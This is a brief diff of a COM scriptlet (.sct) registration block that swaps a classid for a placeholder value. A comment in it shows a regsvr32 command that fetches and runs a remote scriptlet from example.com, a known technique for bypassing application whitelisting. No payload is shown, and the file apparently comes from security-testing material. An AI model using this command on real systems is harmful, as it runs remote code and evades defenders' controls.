@@ -5,7 +5,7 @@
     description="BandarIsHer"
     progid="BandarIsHer"
     version="1.00"
-    classid="{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
+    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
 	>
  
 	<!-- regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
